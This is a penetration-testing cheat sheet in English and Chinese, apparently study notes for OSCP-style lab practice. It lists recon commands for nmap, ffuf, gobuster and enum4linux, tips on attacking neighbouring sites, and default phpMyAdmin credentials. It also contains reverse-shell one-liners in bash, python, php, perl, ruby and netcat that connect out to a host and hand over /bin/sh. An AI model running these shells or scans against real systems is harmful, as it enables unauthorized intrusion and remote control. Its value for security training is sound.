- [1. Recon](#1.%20Recon)
	- [quick inventory](#quick%20inventory)
	- [wordlist](#wordlist)
	- [integrated scanner](#integrated%20scanner)
	- [host and port](#host%20and%20port)
	- [ipv6](#ipv6)
	- [os](#os)
	- [database](#database)
	- [directory](#directory)
	- [smb](#smb)
	- [dns](#dns)
	- [subdomain](#subdomain)
	- [cdn](#cdn)
	- [waf](#waf)
	- [web source code](#web%20source%20code)
	- [website](#website)
	- [asset](#asset)
- [2. Vulns](#2.%20Vulns)
	- [SQL注入](#SQL%E6%B3%A8%E5%85%A5)
	- [文件上传](#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
	- [XSS](#XSS)
	- [命令注入](#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5)
	- [CSRF](#CSRF)
	- [反序列化](#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)
	- [代码审计](#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [3. Privilege Escalation](#3.%20Privilege%20Escalation)
	- [better shell](#better%20shell)
	- [reverse shell](#reverse%20shell)
	- [methodology](#methodology)
	- [手工枚举](#%E6%89%8B%E5%B7%A5%E6%9E%9A%E4%B8%BE)
	- [自动枚举](#%E8%87%AA%E5%8A%A8%E6%9E%9A%E4%B8%BE)
- [4. Post Pentest](#4.%20Post%20Pentest)
- [5. AWD](#5.%20AWD)
- [6. Social Engineer](#6.%20Social%20Engineer)
- [7. Software Engineer](#7.%20Software%20Engineer)
- [Appendix. 靶场](#Appendix.%20%E9%9D%B6%E5%9C%BA)
- [Appendix. 效率工具](#Appendix.%20%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7)
- [Appendix. 学习资料](#Appendix.%20%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99)


# 1. Recon

## quick inventory

- [arsenal](https://github.com/Orange-Cyberdefense/arsenal)

## wordlist

- fzf-wordlists
```bash
find -L /usr/share/wordlists -type f | fzf
```
- [seclists](https://github.com/danielmiessler/SecLists)

## integrated scanner

- [nmap](https://github.com/nmap/nmap)
```bash
# 扫描全端口，用默认脚本探测版本
nmap -n -v -Pn -sS -p- $IP --max-retries=0
nmap -n -v -sC -sV -p $Ports $IP

# 寻找目标IP
nmap -sn $IP/24
# TCP|UDP扫描全端口
nmap -sT --min-rate 10000 -p- $IP && \
nmap -sU --min-rate 10000 -p- $IP
# 使用默认脚本TCP扫描具体端口+版本信息+OS信息
nmap -sT -sC -O -p $Ports $IP
# 使用漏洞脚本扫描固定端口
nmap --script-vuln -p $Ports $IP

# 一句话全模式扫描开放端口
nmap -A $IP -oA nmap/all -p`nmap -sS -sU -Pn -p- $IP --min-rate 10000 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
```
- [AutoRecon](https://github.com/Tib3rius/AutoRecon)
```bash
autorecon -t <target>
```
- [RustScan](https://github.com/RustScan/RustScan)
```bash
rustscan <target> --no-nmap -ulimit 10000
```
- [reconftw](https://github.com/six2dez/reconftw)
```bash
./reconftw.sh -d target.com -r
```

## host and port

- nmap (host and port)
```bash
nmap -sn $IP/24
nmap -sU -sC -O --min-rate 10000 -p- $IP; \
nmap -sT -sC -O --min-rate 10000 -p- $IP
```
- ping (host)
```bash
# ping ip存在与否
ping -c 3 -W 1 $IP
# ping ip/24下ip存在与否
for i in {1..254}; do ping -c 1 -W 1 $sub_IP.$i | grep from; done
```
- nc (port)
```bash
nc.traditional -vv -z $IP 1-65535 2>&1 | grep -v refused
```
- tcp (port)
```bash
IP=xxx.xxx.xxx.xxx
for i in {1..65535}
do
    (echo < /dev/tcp/$IP/$i) &>/dev/null && \ 
    printf "\n[+] Open port: %d\n" "$i" || printf "."
done
```

## ipv6

- nmap
```bash
nmap -6 --min-rate 10000 -p- $IPv6
```

## os

- web yes
	- Windows大小写不敏感
	- 工具识别
- web no
	- nmap -O
- TTL (not accurate)
```
1、WINDOWS NT/2000   TTL：128
2、WINDOWS 95/98     TTL：32
3、UNIX              TTL：255
4、LINUX             TTL：64
5、WIN7         	    TTL：64
```
- special port: 22, 139, 445, 1433, 3389

## database

- default pair
	- asp + access/mssql
	- aspx + mssql
	- php + mysql
	- jsp + mysql/oracle
	- python + mongodb
- common port
	- SQL
		- mysql, 3306
		- sqlserver, 1433
		- oracle, 1521
		- postgresql, 5432
	- NoSQL
		- mongodb, 27017
		- redis, 6379
		- memcached, 11211

## directory

- [dirb](https://www.kali.org/tools/dirb/)
```bash
dirb $IP $Wordlist
```
- [ffuf](https://www.kali.org/tools/ffuf/)
```bash
ffuf -fs 185 -c -w \$(fzf-wordlists) -H 'Host: FUZZ.org' -u "http://$TARGET/"
ffuf -w /usr/share/dirb/wordlists/common.txt -fc 403,404 -fs 185 -u "http://$TARGET/FUZZ" -p 1
```

## smb

- [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)
```bash
enum4linux -A $IP
```

## dns

- dig
- nslookup
- whois
- [theHaverster](https://github.com/laramies/theHarvester)
	- email
	- subdomain
	- name
```bash
theHarvester -d $DOMAIN_NAME -b google
```
- [crt.sh](https://crt.sh)

## subdomain

- [gobuster](https://github.com/OJ/gobuster)
```bash
# fzf-wordlists
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
# gobuster
gobuster vhost -u <http://target.com> -w /path/to/wordlist.txt --append-domain -t $THREAD_NUM
```

## cdn

- online ping
	- [http://ping.chinaz.com/](http://ping.chinaz.com/)
	- [http://ping.aizhan.com/](http://ping.aizhan.com/)
	- [http://ce.cloud.360.cn/](http://ce.cloud.360.cn/)
	- [https://ip.tool.chinaz.com/](https://ip.tool.chinaz.com/)
	- [https://get-site-ip.com/](https://get-site-ip.com/)
	- [https://tools.ipip.net/cdn.php/](https://tools.ipip.net/cdn.php/)

## waf

- [waf00f](https://github.com/EnableSecurity/wafw00f)
- [identYwaf](https://github.com/stamparm/identywaf)
- nmap
	- nmap --script=http-waf-fingerprint
	- nmap --script=http-waf-detect

## web source code

- 目录结构
	- 后台目录
	- 模板目录
	- 数据库目录
	- 数据库配置文件
- 脚本类型
	- asp
	- php
	- jsp
	- java
- 应用分类
	- 门户
	- 电商
	- 论坛
	- 博客
- 其他补充
	- 框架or非框架
	- CMS识别
	- 开源or闭源
	- 源码获取

## website

1. 目录型站点（例如，[www.xxx.com/bbs](http://www.xxx.com/bbs)）
    - 主站的漏洞
    - 子站的漏洞
2. 端口类站点，shodan扫描
3. 子域名站点（子域名和域名可能不在一个服务器上）
4. 类似域名站点（原有域名弃用，但是还能访问；二级or顶级域名更换，旧域名找到突破口）
    - 社工方式找到相关域名信息
5. 旁注，C段站点（在线工具：[https://www.webscan.cc/](https://www.webscan.cc/)
    1. 旁注：同一个服务器上面存在多个站点、但是你要攻击的是A网站由于各种原因不能完成安全测试。就通过测试B网站进入服务器然后在攻击A网站最终实现目的。
    2. C段：不同的服务器上面存在不同的网站，通过扫描发现与你渗透测试的是同一个网段最终拿下服务器、然后通过内网渗透的方式拿下渗透服务器。
6. 搭建软件特征站点
    - 有的网站是借助于第三方的集成搭建工具实现例如：PHPstudy、宝塔等环境这样的集成环境搭建的危害就是泄露了详细的版本信息。
    - phpstudy搭建了之后在默认的站点安装了phpmyadmin有的网站没有做安全性直接可以通过用户名：root密码：root 登录进入

## asset

- github
- search
	- subdomain
	- dns
	- cdn
	- 备案、证书
- search engine
	- fofa
	- shodan
	- zoomeye

# 2. Vulns

## SQL注入

## 文件上传

## XSS

## 命令注入

## CSRF

## 反序列化

## 代码审计

# 3. Privilege Escalation

## better shell

- 获得一个舒服的shell
```bash
# Host
rlwrap nc -lvnp 4444

# Remote
export TERM=xterm-color
dpkg -l | grep python # which python
python -c "import pty;pty.spawn('/bin/bash')"
##After ctrl+z
stty raw -echo; fg
```
- [online shellcheck](https://www.shellcheck.net)

## reverse shell

reference:
- [online generator](https://www.revshells.com)

cheatsheet:
- bash
```bash
bash -i >& /dev/tcp/<host>/4444 0>&1
```
- python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- php
```bash
php -r '$sock=fsockopen("10.134.188.54",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
- perl
```bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
- ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
- netcat
```bash
nc -e /bin/sh <host> 4444
```

## methodology

## 手工枚举

## 自动枚举

# 4. Post Pentest

# 5. AWD

# 6. Social Engineer

# 7. Software Engineer

# Appendix. 靶场

- [ ] [OSCP练习推荐靶场库](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8)

# Appendix. 效率工具

- vim
- tmux

# Appendix. 学习资料

- Linux Privilege Escalation from 红队笔记
	- [ ] [Linux提权精讲：原理和枚举](https://www.bilibili.com/video/BV1Wh4y1H7LK)
	- [ ] [Linux提权精讲：演示1 - 服务漏洞利用提权](https://www.bilibili.com/video/BV19s4y1D7Mt)
	- [ ] [Linux提权精讲：演示2 - 20种Linux渗透测试提权演示精讲](https://www.bilibili.com/video/BV1Es4y1M7ZL)
	- [ ] [Linux提权精讲：Sudo风暴全70讲](https://www.bilibili.com/video/BV1DV4y1U7bT)